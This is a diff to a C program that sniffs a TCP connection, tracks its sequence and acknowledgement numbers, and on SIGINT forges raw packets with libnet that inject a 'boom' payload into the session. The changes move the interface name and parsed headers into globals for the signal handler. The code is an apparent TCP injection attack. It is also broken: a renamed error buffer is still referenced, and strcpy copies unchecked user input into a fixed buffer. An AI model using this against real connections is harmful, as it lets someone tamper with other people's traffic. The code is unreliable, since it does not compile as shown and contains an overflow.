@@ -19,6 +19,8 @@
 
 u_int32_t global_seq = 0;
 u_int32_t global_ack = 0;
+struct hdrs *global_headers = NULL;
+char global_dev_name[100];
 
 /*void attack_handler (int signum) {
   char command[4] = "boom"
@@ -64,11 +66,12 @@ char *get_ip_address(char *interface) {
 
 void SIGINT_handler(int signum) {
 	printf("In the handler!\n");
-	printf("seq: [%u]\n", global_seq);
-	printf("ack: [%u]\n", global_ack);
+	printf("global_seq: [%u]\n", global_seq);
+	printf("global_ack: [%u]\n", global_ack);
+	printf("global_dev_name: %s\n", global_dev_name);
 
-	char errbuf2[LIBNET_ERRBUF_SIZE]; 
-	libnet_t *l = libnet_init(LIBNET_RAW4, dev_name, errbuf2);
+	char errbuf[LIBNET_ERRBUF_SIZE]; 
+	libnet_t *l = libnet_init(LIBNET_RAW4, global_dev_name, errbuf);
 	if (l == NULL) {
 		printf("libnet_init(): %s\n", errbuf2);
 		exit(1);
@@ -77,8 +80,8 @@ void SIGINT_handler(int signum) {
 	libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER;
 	libnet_ptag_t ipv4_tag = LIBNET_PTAG_INITIALIZER;
 
-	struct tcp_hdr *tcp_header = headers->tcp_header;
-	struct ip_hdr *ip_header = headers->ip_header;
+	struct tcp_hdr *tcp_header = global_headers->tcp_header;
+	struct ip_hdr *ip_header = global_headers->ip_header;
 
 	char payload[] = {'b', 'o', 'o', 'm', '\r', '\n'};
 
@@ -200,10 +203,12 @@ int main(int argc, char **argv) {
 		server_name = argv[1];
 		server_port = argv[2];
 		dev_name = "eth0";
+		strcpy(global_dev_name, "eth0");
 	} else if (argc == 4) {
 		server_name = argv[1];
 		server_port = argv[2];
 		dev_name = argv[3];
+		strcpy(global_dev_name, dev_name);
 		if (!device_exists(dev_name)) {
 			printf("Device does not exist.\n");
 			exit(1);
@@ -282,6 +287,7 @@ int main(int argc, char **argv) {
         struct hdrs *headers = analyze_packet(pkt_data);
         log_headers(headers);
 
+        global_headers = headers;
         if (headers->tcp_header) {
         	global_seq = ntohl(headers->tcp_header->tcp_seq);
         	global_ack = ntohl(headers->tcp_header->tcp_ack);
